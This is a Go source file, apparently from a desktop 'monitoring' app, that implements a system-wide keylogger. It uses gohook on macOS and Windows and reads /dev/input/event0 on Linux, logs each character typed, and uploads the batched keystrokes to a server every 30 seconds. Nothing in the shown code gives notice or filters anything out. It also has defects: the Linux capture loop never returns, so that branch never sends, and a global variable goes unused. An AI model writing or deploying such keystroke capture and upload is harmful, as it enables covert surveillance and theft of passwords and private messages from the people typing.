package monitoring

import (
	"fmt"
	"log"
	"runtime"
	"strings"
	"time"

	"github.com/imrancluster/techmongo/fyne/tprocess/internal/network"
	"github.com/imrancluster/techmongo/fyne/tprocess/internal/utils"

	"github.com/MarinX/keylogger"
	hook "github.com/robotn/gohook"
)

var keyPresses []string // Global variable to hold key presses

// StartKeyboardMonitoring starts capturing keyboard events and sends data every 30 seconds
func StartKeyboardMonitoring() {
	if runtime.GOOS == "linux" {
		utils.Logger().Println("Linux OS detected. You may need to run with root privileges.")
		go startLinuxKeyboardMonitoring()
	} else if runtime.GOOS == "darwin" || runtime.GOOS == "windows" {
		utils.Logger().Println("macOS/Windows OS detected. Using gohook for capturing keyboard events.")
		go startMacOrWindowsKeyboardMonitoring()
	} else {
		utils.Logger().Println("Unsupported OS detected.")
	}
}

// startMacOrWindowsKeyboardMonitoring handles keyboard event capture for macOS and Windows using gohook
func startMacOrWindowsKeyboardMonitoring() {
	for {
		keyEvents := captureMacOrWindowsKeyEvents()
		network.SendKeyEventsToServer(keyEvents)
		time.Sleep(30 * time.Second) // Send data every 30 seconds
	}
}

// captureMacOrWindowsKeyEvents captures key press events using gohook (macOS/Windows)
func captureMacOrWindowsKeyEvents() string {
	var keyPresses []string

	// Register event for key press and capture
	evChan := hook.Start()
	defer hook.End()

	timeout := time.After(30 * time.Second) // Monitor key presses for 30 seconds
loop:
	for {
		select {
		case ev := <-evChan:
			if ev.Kind == hook.KeyDown {
				keyPresses = append(keyPresses, fmt.Sprintf("%s", string(ev.Keychar)))
				utils.Logger().Printf("Key pressed: %s\n", string(ev.Keychar))

			}
		case <-timeout:
			break loop
		}
	}

	return strings.Join(keyPresses, ", ")
}

// startLinuxKeyboardMonitoring handles keyboard event capture on Linux using keylogger
func startLinuxKeyboardMonitoring() {
	kb, err := keylogger.New("/dev/input/event0") // Adjust based on your device
	if err != nil {
		log.Printf("Error initializing keylogger: %v", err)
		return
	}

	events := kb.Read()

	for {
		keyEvents := captureLinuxKeyEvents(events)
		network.SendKeyEventsToServer(keyEvents)
		time.Sleep(30 * time.Second) // Send data every 30 seconds
	}
}

// captureLinuxKeyEvents captures key press events for Linux
func captureLinuxKeyEvents(events chan keylogger.InputEvent) string {
	var keyboardActivity []string

	// Loop through keylogger events
	for event := range events {
		if event.Type == keylogger.EvKey && event.Value == 1 { // 1 means key pressed
			keyboardActivity = append(keyboardActivity, event.KeyString())
		}
	}

	return strings.Join(keyboardActivity, ", ")
}
